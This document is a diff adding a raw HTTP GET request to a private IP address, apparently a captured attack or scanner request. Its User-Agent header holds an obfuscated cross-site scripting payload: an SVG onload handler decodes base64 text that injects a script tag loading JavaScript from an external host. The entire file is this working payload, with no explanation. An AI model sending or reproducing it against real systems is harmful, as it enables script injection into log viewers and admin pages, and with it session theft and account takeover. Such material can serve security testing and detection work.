@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: <svg/onload=eval(atob(URL.slice(-148)))>#d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoL3NjcmlwdC8uc291cmNlKSkuc3JjPWF0b2IoL0x5OWljblYwWld4dloybGpMbU52YlM1aWNpOHkvLnNvdXJjZSk=
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
